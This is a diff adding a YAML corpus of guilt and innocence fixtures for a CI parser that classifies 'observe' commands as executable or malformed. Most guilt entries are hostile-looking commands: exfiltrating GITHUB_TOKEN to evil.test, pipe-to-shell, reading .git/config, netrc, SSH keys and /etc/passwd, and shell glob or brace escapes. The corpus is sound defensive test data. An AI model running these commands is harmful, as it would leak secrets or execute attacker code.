@@ -1,0 +1,573 @@
+# Guilt + innocence corpus for scripts/ci/bites_parse.py --selftest.
+# DATA, not code: it was 218 lines inside the module until 2026-09-04, when Zero
+# ruled the module itself had to shrink. Each entry is one pack and the
+# classification the parser must give it. `class` is one of absent / legacy /
+# executable / malformed.
+#
+# Two forms. The compact one names only `observe:` (plus consumer/where/expect when
+# they differ from the defaults) and the loader builds the pack around it. The
+# verbatim one carries the whole `pack:` text, for fixtures that are ABOUT the YAML
+# layer itself - duplicate keys, aliases, indentation, invisible characters.
+#
+# Invisible characters are written as \u escapes in double-quoted scalars on
+# purpose: a corpus that carries a literal zero-width space is a file whose own
+# reviewer cannot see what it says, which is the very defect these fixtures test.
+#
+# Adding a guard means adding BOTH a guilt and an innocence entry here
+# (infra/guard-conformance enforces the pair).
+- label: absent-no-bites-key
+  pack: "gear: 3\nspend:\n  tokens: 1\n"
+  class: absent
+- label: absent-empty-document
+  pack: ""
+  class: absent
+- label: legacy-prose-scalar
+  pack: "gear: 3
+
+    bites: Damar's next publish - the cover renders.
+
+    "
+  class: legacy
+- label: legacy-block-without-observe
+  pack: "gear: 3\nbites:\n  consumer: CI\n  observation: green on main\n"
+  class: legacy
+- label: ok-selftest
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: executable
+- label: ok-pytest
+  # RULED 2026-09-04 b flip: `python3 -m pytest` left with every other first token.
+  observe: python3 -m pytest scripts/tests/test_bites_parse.py
+  class: malformed
+- label: ok-fly-status
+  observe: flyctl status -a nuzantara-rag
+  class: executable
+  where: fly
+  expect: contains:deployed
+- label: ok-curl-https
+  # RULED 2026-09-04 b flip: `curl` left the allow-list entirely.
+  observe: curl -sS https://nuzantara-rag.fly.dev/health
+  class: malformed
+  where: fly
+  expect: regex:ok
+- label: ok-sha-placeholder
+  # RULED 2026-09-04 b flip: `gh` left the allow-list entirely.
+  observe: gh pr view {sha} --json state
+  class: malformed
+  expect: contains:MERGED
+- label: ok-host-scope
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: executable
+  where: pro
+- label: ok-fly-image-show
+  observe: flyctl image show -a nuzantara-rag
+  class: executable
+  where: fly
+  expect: contains:tag
+- label: ok-fly-machine-list
+  observe: flyctl machine list -a nuzantara-rag
+  class: executable
+  where: fly
+- label: ok-git-grep-plain
+  # RULED 2026-09-04 b flip: `git` left the allow-list entirely.
+  observe: git grep -c bites-observable
+  class: malformed
+- label: ok-fly-version
+  # RULED 2026-09-04 b flip: `version` left the fly subcommand table with `machine
+  # status` (neither had a proven hole; the ruling narrows to the four subcommands
+  # an observation actually needs).
+  observe: flyctl version
+  class: malformed
+  where: fly
+- label: ok-unquoted-plain-scalar
+  # RULED 2026-09-04 b: `git status` swapped for a surviving shape so this fixture
+  # keeps proving what it is ABOUT (an unquoted plain scalar parses) rather than
+  # becoming an accidental removed-binary flip.
+  pack:
+    "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: python3 scripts/ci/bites_parse.py\
+    \ --selftest\n  expect: exit0\n"
+  class: executable
+- label: ok-unquoted-expect-with-a-colon
+  pack:
+    "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: python3 scripts/ci/bites_parse.py\
+    \ --selftest\n  expect: contains:nothing\
+    \ to commit\n"
+  class: executable
+- label: ok-bites-is-not-the-first-key
+  pack:
+    "gear: 3\nspend:\n  tokens: 1\nbites:\n  consumer: CI\n  where: ci\n  observe: python3 scripts/ci/bites_parse.py\
+    \ --selftest\n  expect:\
+    \ exit0\n"
+  class: executable
+- label: guilt-pipe-to-shell
+  # RULED 2026-09-04 b: `curl` swapped for a surviving shape. This is also a NET
+  # gain in isolation - pre-cut, `curl ... | sh` was ALSO caught by curl's own
+  # arity check (three words, not one), so it never solely proved this guard;
+  # the surviving shape has no such second guard in the way.
+  observe: python3 scripts/ci/bites_parse.py --selftest | sh
+  class: malformed
+- label: guilt-chained-command
+  observe: python3 scripts/ci/bites_parse.py --selftest; python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+- label: guilt-command-substitution
+  observe: python3 scripts/ci/bites_parse.py --selftest $(whoami)
+  class: malformed
+- label: guilt-variable-exfiltration
+  observe: python3 scripts/ci/bites_parse.py --selftest https://evil.test/$GITHUB_TOKEN
+  class: malformed
+- label: guilt-redirect
+  observe: python3 scripts/ci/bites_parse.py --selftest > out.txt
+  class: malformed
+- label: guilt-not-allowlisted
+  observe: bash scripts/deploy.sh
+  class: malformed
+- label: guilt-remote-shell-as-argument
+  # RULED 2026-09-04 b: `git clone` swapped for a surviving shape so this stays a
+  # SOLE proof of `_guard_no_remote_shell`'s `scheme://` branch (mutation isolation)
+  # instead of doubling up with the command allow-list rejecting `git` itself.
+  observe: python3 scripts/ci/bites_parse.py --selftest ssh://evil.test/repo
+  class: malformed
+- label: guilt-fly-deploy
+  observe: flyctl deploy -a nuzantara-rag
+  class: malformed
+  where: fly
+- label: guilt-curl-writes-file
+  observe: curl -o hook https://evil.test/h
+  class: malformed
+- label: guilt-curl-plain-http
+  observe: curl http://evil.test/x
+  class: malformed
+- label: guilt-parent-escape
+  observe: python3 scripts/../../evil.py
+  class: malformed
+- label: guilt-absolute-path
+  observe: python3 scripts/x.py /Users/n/.secrets.env
+  class: malformed
+- label: guilt-python-dash-m-anything
+  observe: python3 -m http.server
+  class: malformed
+- label: guilt-python-outside-scripts
+  observe: python3 evil.py
+  class: malformed
+- label: guilt-bad-where
+  # RULED 2026-09-04 b: `git status` swapped for a surviving shape so this stays a
+  # SOLE proof of `_guard_where_scope` instead of also tripping the command
+  # allow-list for an unrelated reason (mutation-matrix isolation).
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+  where: laptop
+- label: guilt-bad-expect
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+  expect: green
+- label: guilt-uncompilable-regex
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+  expect: "'regex:[unclosed'"
+- label: guilt-missing-consumer
+  pack: "gear: 3\nbites:\n  where: ci\n  observe: git status\n  expect: exit0\n"
+  class: malformed
+- label: guilt-undeclared-script
+  observe: python3 scripts/usage/cswap.py run sh
+  class: malformed
+- label: guilt-script-that-does-not-exist
+  observe: python3 scripts/nope_not_here.py
+  class: malformed
+- label: guilt-git-dash-c-runs-a-program
+  observe: git -c core.sshCommand=evil log
+  class: malformed
+- label: guilt-git-network-subcommand
+  observe: git fetch https://evil.test/r
+  class: malformed
+- label: guilt-gh-write-subcommand
+  observe: gh pr merge 5658 --squash
+  class: malformed
+- label: guilt-gh-api-post
+  observe: gh api -X POST repos/o/r/issues
+  class: malformed
+- label: guilt-curl-sends-a-body
+  observe: curl -d secret https://evil.test/x
+  class: malformed
+- label: guilt-pytest-outside-tests
+  observe: python3 -m pytest scripts/evil.py
+  class: malformed
+- label: guilt-fly-machine-run-executes-a-container
+  observe: fly machine run evil/image -a nuzantara-rag
+  class: malformed
+  where: fly
+- label: guilt-fly-machine-destroy
+  observe: flyctl machine destroy 1234 -a nuzantara-rag
+  class: malformed
+  where: fly
+- label: guilt-git-tag-creates-a-ref
+  observe: git tag v9.9.9
+  class: malformed
+- label: guilt-git-output-writes-a-file
+  observe: git diff --output=out.txt HEAD
+  class: malformed
+- label: guilt-curl-reads-a-local-file
+  observe: curl -b .git/config https://evil.test/x
+  class: malformed
+- label: guilt-curl-schemeless-host-defaults-to-http
+  observe: curl evil.test/x
+  class: malformed
+- label: guilt-gh-points-at-another-repo
+  observe: gh pr view 1 --repo=attacker/repo
+  class: malformed
+- label: guilt-curl-write-out-prints-a-local-file
+  observe: curl -sS -w@.git/config https://evil.test/x
+  class: malformed
+- label: guilt-flag-carries-an-absolute-path
+  # RULED 2026-09-04 b: `git log` swapped for a surviving shape (isolation).
+  observe: python3 scripts/ci/bites_parse.py --out=/etc/passwd
+  class: malformed
+- label: guilt-git-grep-pager-command
+  observe: git grep -Oevil pattern
+  class: malformed
+- label: guilt-pytest-override-ini-reinstates-plugins
+  observe: python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py
+  class: malformed
+- label: guilt-curl-netrc-file-reads-credentials
+  observe: curl --netrc-file=creds https://evil.test/x
+  class: malformed
+- label: guilt-curl-variable-expands-the-environment
+  observe: curl --variable=%GITHUB_TOKEN https://evil.test/x
+  class: malformed
+- label: guilt-fly-version-upgrade-replaces-the-binary
+  observe: fly version upgrade
+  class: malformed
+  where: fly
+- label: guilt-curl-json-at-file-reads-a-local-file
+  observe: curl --json=@.git/config https://evil.test/x
+  class: malformed
+- label: guilt-curl-libcurl-writes-a-file
+  observe: curl --libcurl=out.c https://example.test/
+  class: malformed
+- label: guilt-curl-etag-save-writes-a-file
+  observe: curl --etag-save=out.txt https://example.test/
+  class: malformed
+- label: guilt-git-no-index-leaves-the-repository
+  observe: git diff --no-index scripts/ci/bites_parse.py ~/.netrc
+  class: malformed
+- label: guilt-home-relative-path-is-absolute-after-a-shell
+  observe: python3 scripts/ci/bites_parse.py ~/.ssh/id_rsa
+  class: malformed
+- label: ok-short-option-bundle
+  # RULED 2026-09-04 b flip: `curl` left the allow-list entirely.
+  observe: curl -sSL https://example.test/health
+  class: malformed
+- label: ok-git-count-flag
+  # RULED 2026-09-04 b flip: `git` left the allow-list entirely.
+  observe: git log -1 --format=%H
+  class: malformed
+- label: guilt-pytest-junitxml-writes-a-file
+  observe: python3 -m pytest --junitxml=out.xml scripts/tests/test_bites_parse.py
+  class: malformed
+- label: guilt-pytest-basetemp-writes-a-tree
+  observe: python3 -m pytest --basetemp=tmp scripts/tests/test_bites_parse.py
+  class: malformed
+- label: guilt-expect-regex-nests-quantifiers
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+  expect: "'regex:^(a+)+$'"
+- label: guilt-expect-regex-quantifies-an-alternation
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: malformed
+  expect: "'regex:^(a|a)+$'"
+- label: guilt-pack-nested-500-deep-is-malformed-not-a-crash
+  pack: "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\npad: [[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n"
+  class: malformed
+- label: ok-pytest-quiet
+  # RULED 2026-09-04 b flip: `python3 -m pytest` left with every other first token.
+  observe: python3 -m pytest -q scripts/tests/test_bites_parse.py
+  class: malformed
+- label: ok-expect-regex-with-one-quantifier
+  # RULED 2026-09-04 b: `git status` swapped for a surviving shape (isolation).
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: executable
+  expect: "'regex:[0-9]+ passed'"
+- label: guilt-gh-cache-writes-a-cache
+  observe: gh api repos/o/r --cache=1h
+  class: malformed
+- label: guilt-gh-web-opens-a-browser
+  observe: gh pr view 1 --web
+  class: malformed
+- label: guilt-git-paginate-starts-a-pager
+  observe: git --paginate log -1
+  class: malformed
+- label: guilt-git-help-starts-man
+  observe: git --help log
+  class: malformed
+- label: guilt-git-gpg-format-runs-a-program
+  observe: git log -1 --format=%GG
+  class: malformed
+- label: guilt-fly-config-reads-a-file
+  observe: fly status --config=.git/config
+  class: malformed
+  where: fly
+- label: guilt-pytest-with-no-target-walks-the-tree
+  observe: python3 -m pytest
+  class: malformed
+- label: guilt-pytest-separate-value-looks-like-a-target
+  observe: python3 -m pytest -k tests
+  class: malformed
+- label: guilt-pytest-args-from-file
+  observe: python3 -m pytest @scripts/tests/args.txt
+  class: malformed
+- label: guilt-pytest-warning-filter-imports-a-module
+  observe: python3 -m pytest -W=error::evil.Custom scripts/tests/test_bites_parse.py
+  class: malformed
+- label: guilt-invisible-character-in-a-key-hides-the-whole-block
+  pack: "bites\u200B:\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
+  class: malformed
+- label: guilt-invisible-character-duplicates-a-key-invisibly
+  pack:
+    "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  observe\u200B: git log\n  expect:\
+    \ exit0\n"
+  class: malformed
+- label: guilt-misspelled-key-is-a-broken-contract-not-prose
+  pack: "bites:\n  consumer: x\n  where: ci\n  obsevre: git log\n  expect: exit0\n"
+  class: malformed
+- label: guilt-bites-is-a-list
+  pack: "bites: []
+
+    "
+  class: malformed
+- label: ok-pytest-glued-option-value
+  # RULED 2026-09-04 b flip: `python3 -m pytest` left with every other first token.
+  observe: python3 -m pytest -k=bites scripts/tests/test_bites_parse.py
+  class: malformed
+- label: guilt-dotdot-glued-after-a-colon
+  # RULED 2026-09-04 b: `git log -L` swapped for a surviving shape so this stays a
+  # SOLE proof of `_guard_path_containment`'s slash-split-misses branch.
+  observe: python3 scripts/ci/bites_parse.py --range=1,1:../secret
+  class: malformed
+- label: guilt-tilde-user-is-still-a-tilde
+  observe: python3 scripts/ci/bites_parse.py ~otheruser/.ssh/id_rsa
+  class: malformed
+- label: guilt-fly-status-with-a-trailing-word-is-rejected
+  # RULED 2026-09-04 b: `version` (the only OTHER fixture proving NO_SUBCOMMAND
+  # rejects a second word) left the fly subcommand table entirely, so this fixture
+  # keeps that mechanism provable against the two surviving NO_SUBCOMMAND entries.
+  observe: fly status upgrade -a nuzantara-rag
+  class: malformed
+  where: fly
+- label: ok-diff-filter
+  # RULED 2026-09-04 b flip: `git` left the allow-list entirely.
+  observe: git diff --cached --name-only --diff-filter=ACMR
+  class: malformed
+- label: ok-pathspec-separator
+  observe: git diff --name-only -- apps/backend-rag
+  class: malformed
+- label: ok-diff-context
+  observe: git diff -U0 HEAD
+  class: malformed
+- label: ok-curl-max-time-separate-value
+  # RULED 2026-09-04 b flip: `curl` left the allow-list entirely.
+  observe: curl -fsS -m 5 https://nuzantara-rag.fly.dev/health
+  class: malformed
+  where: fly
+- label: ok-curl-write-out-separate-value
+  observe: curl -sS -w %{http_code} https://nuzantara-rag.fly.dev/health
+  class: malformed
+  where: fly
+- label: ok-url-query-string-carrying-at
+  # RULED 2026-09-04 b: `curl` swapped for a surviving shape so this stays a SOLE
+  # proof of `_guard_args_from_file`'s over-match innocence (a URL query string
+  # carrying `@` is not a file-open) instead of an accidental removed-binary flip.
+  observe: python3 scripts/ci/bites_parse.py --selftest https://nuzantara-rag.fly.dev/health?cb=@2
+  class: executable
+- label: guilt-two-bites-blocks-in-one-pack
+  pack:
+    "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\nbites:\n  consumer:\
+    \ attacker\n  where: ci\n  observe: git log\n  expect: exit0\n"
+  class: malformed
+- label: guilt-two-observe-keys-in-one-block
+  pack: "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  observe: git log\n  expect: exit0\n"
+  class: malformed
+- label: guilt-alias-puts-the-command-elsewhere
+  pack:
+    "anchors:\n  cmd: &cmd git log\nbites:\n  consumer: x\n  where: ci\n  observe: *cmd\n  expect:\
+    \ exit0\n"
+  class: malformed
+- label: guilt-merge-key-imports-a-block
+  pack: "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\nbites:\n  <<: *base\n"
+  class: malformed
+- label: guilt-expect-typed-as-a-boolean
+  pack: "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n"
+  class: malformed
+- label: guilt-observe-typed-as-a-number
+  pack: "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n"
+  class: malformed
+- label: guilt-bites-present-but-empty
+  pack: "gear: 3
+
+    bites:
+
+    "
+  class: malformed
+- label: guilt-pack-is-not-a-mapping
+  pack: "- gear: 3
+
+    - bites: x
+
+    "
+  class: malformed
+- label: guilt-pack-is-not-yaml
+  pack: "gear: 3\n\tbites:\n  consumer: x\n"
+  class: malformed
+- label: guilt-zero-width-splits-the-two-readings
+  pack: "bites:\n  consumer: x\n  where: ci\n  observe: \"git\u200B status\"\n  expect: exit0\n"
+  class: malformed
+- label: guilt-gh-jq-reads-the-runner-environment
+  observe: gh api repos/o/r --jq env.GITHUB_TOKEN
+  class: malformed
+- label: guilt-gh-short-q-reads-the-runner-environment
+  observe: gh pr view 1 --json state -q env.GH_TOKEN
+  class: malformed
+- label: guilt-gh-jq-even-for-an-innocent-filter
+  observe: gh api repos/o/r --jq .name
+  class: malformed
+- label: ok-gh-json-is-the-shape-that-survives
+  # RULED 2026-09-04 b flip: `gh` left the allow-list entirely - the shape that
+  # "survived" the `--jq` removal did not survive the binary's own removal.
+  observe: gh pr view 5658 --json state
+  expect: contains:MERGED
+  class: malformed
+- label: guilt-fly-logs-crosses-the-output-boundary
+  observe: flyctl logs -a nuzantara-rag
+  where: fly
+  class: malformed
+- label: guilt-yaml-escaped-zero-width-char-in-a-value
+  # RULED 2026-09-04 b: `git status` swapped for a surviving shape (isolation).
+  pack:
+    "bites:\n  consumer: \"x\\u200bY\"\n  where: ci\n  observe: python3 scripts/ci/bites_parse.py\
+    \ --selftest\n  expect: exit0\n"
+  class: malformed
+- label: ok-the-same-double-quoted-value-without-the-escape
+  pack:
+    "bites:\n  consumer: \"xY\"\n  where: ci\n  observe: python3 scripts/ci/bites_parse.py\
+    \ --selftest\n  expect: exit0\n"
+  class: executable
+- label: guilt-args-from-file-only-this-guard-refuses-a-gh-header-file-read
+  observe: gh api repos/o/r --header=@secrets.txt
+  class: malformed
+- label: guilt-args-from-file-still-refuses-an-at-prefixed-argument
+  # RULED 2026-09-04 b: `gh` left the allow-list entirely, so the fixture above no
+  # longer solely proves `_guard_args_from_file` (the command allow-list rejects
+  # `gh` on its own now too). This is the surviving-shape replacement.
+  observe: python3 scripts/ci/bites_parse.py @scripts/tests/args.txt
+  class: malformed
+- label: guilt-remote-shell-only-this-guard-refuses-a-bare-ssh-argument
+  # RULED 2026-09-04 b: `git log` swapped for a surviving shape (isolation).
+  observe: python3 scripts/ci/bites_parse.py --selftest ssh
+  class: malformed
+- label: ok-remote-shell-over-match-searching-for-the-WORD-ssh-is-innocent
+  observe: python3 scripts/ci/bites_parse.py --selftest --grep=ssh
+  class: executable
+- label: guilt-gh-api-absolute-url-leaves-github-and-carries-a-token
+  observe: gh api https://attacker.test/collect
+  class: malformed
+- label: guilt-gh-api-absolute-url-even-when-it-points-at-github
+  observe: gh api https://api.github.com/repos/o/r
+  class: malformed
+- label: guilt-gh-template-is-an-expression-language-over-the-response
+  observe: gh pr view 1 --template '{{.state}}'
+  class: malformed
+- label: ok-gh-api-rest-path-is-the-shape-that-survives
+  # RULED 2026-09-04 b flip: `gh` left the allow-list entirely - the shape that
+  # "survived" two rounds of narrowing did not survive the binary's own removal.
+  observe: gh api repos/o/r --json url
+  class: malformed
+- label: guilt-git-format-placeholder-in-a-separate-value
+  observe: git log --format '%GS' HEAD
+  class: malformed
+- label: guilt-git-pretty-placeholder-in-a-separate-value
+  observe: git show --pretty '%G?' HEAD
+  class: malformed
+- label: ok-git-format-glued-is-the-shape-that-survives
+  # RULED 2026-09-04 b flip: `git` left the allow-list entirely - the shape that
+  # "survived" the placeholder-blindness fix did not survive the binary's removal.
+  observe: git log --format=%H
+  class: malformed
+
+# RULED 2026-09-04 b — new fixtures for the two surviving shapes, named explicitly
+# in the ruling rather than inferred from an existing pattern.
+- label: guilt-python3-parent-escape-from-the-first-token
+  observe: python3 ../x.py
+  class: malformed
+- label: guilt-python3-absolute-script-path
+  observe: python3 /abs/x.py
+  class: malformed
+- label: guilt-python3-script-named-does-not-exist
+  observe: python3 scripts/missing.py
+  class: malformed
+- label: guilt-python3-semicolon-after-an-in-tree-looking-path
+  observe: python3 scripts/ci/x.py; id
+  class: malformed
+- label: guilt-fly-machine-run-bare
+  observe: fly machine run
+  class: malformed
+  where: fly
+- label: guilt-flyctl-deploy-bare
+  observe: flyctl deploy
+  class: malformed
+  where: fly
+- label: ok-fly-status-fly-alias
+  observe: fly status -a nuzantara-rag
+  class: executable
+  where: fly
+- label: ok-fly-image-show-fly-alias
+  observe: fly image show -a nuzantara-rag
+  class: executable
+  where: fly
+
+# kimi-code/k3 refuter pass on the two-shape cut (RULED 2026-09-04 b), reproduced
+# before applying: brace expansion is a shell primitive `_guard_shell_composition`
+# did not refuse, and it defeats the marker check by construction — see the
+# comment on `shell_metachars` in bites_allowlist.yaml for the full mechanism.
+- label: guilt-brace-expansion-defeats-the-observable-marker
+  observe: python3 scripts/ci/{evil,evil}.py
+  class: malformed
+- label: ok-braces-in-the-sha-placeholder-are-not-an-escape
+  observe: python3 scripts/ci/bites_parse.py --selftest {sha}
+  class: executable
+
+# kimi-code/k3, refuting the two-shape cut's final bytes, raised three more
+# findings in the same pass — reproduced against the real guard functions
+# before any of them were applied (see bites_parse.py's docstrings on
+# `_subcommand_permitted`, `_check_fly` and `_guard_observable_script`).
+- label: guilt-fly-image-show-extra-positional-before-any-flag
+  # SOLE proof of _subcommand_permitted's exact-length check: matching only
+  # words[0]/words[1] let `fly image show <ref>` through with <ref> unchecked,
+  # and flyctl's `image show` does not reject the extra argv itself.
+  observe: fly image show extra-ref
+  class: malformed
+  where: fly
+- label: guilt-fly-status-extra-positional-after-a-flag-value
+  # SOLE proof of the extra-argv loop in _check_fly: a positional planted
+  # AFTER -a/--app's own value was never inspected by the subcommand-table
+  # check (already past it) or by the flag check (only looks at `-` tokens).
+  observe: fly status -a nuzantara-rag anyword
+  class: malformed
+  where: fly
+- label: guilt-python3-marker-string-in-a-non-py-file
+  # SOLE proof of the `.py`-suffix check: bites_allowlist.yaml itself carries
+  # the literal marker string in its own `observable_marker:` key, so a byte
+  # grep alone would have called this data file executable.
+  observe: python3 scripts/ci/bites_allowlist.yaml
+  class: malformed
+
+# tp1-qwen3.8-max, second refuter on the two-shape cut (2026-09-05), reproduced
+# before applying: a shell's pathname (glob) expansion treats `[a]` as a bracket
+# expression, so `python3 scripts/[a].py` can execute a DIFFERENT file
+# (`scripts/a.py`) than the one this parser's marker check inspected, the same
+# escape class as brace expansion but via `[`/`]` instead of `{`/`}`.
+- label: guilt-bracket-glob-defeats-the-observable-marker
+  observe: python3 scripts/ci/[evil].py
+  class: malformed
+- label: ok-brackets-outside-an-observe-path-are-not-an-escape
+  # A `[`/`]` pair appearing in the pack's OTHER keys (not the observe string
+  # itself) is not this guard's concern - it only inspects `observe:`.
+  observe: python3 scripts/ci/bites_parse.py --selftest
+  class: executable
+  expect: "regex:[0-9]+/[0-9]+ pass"
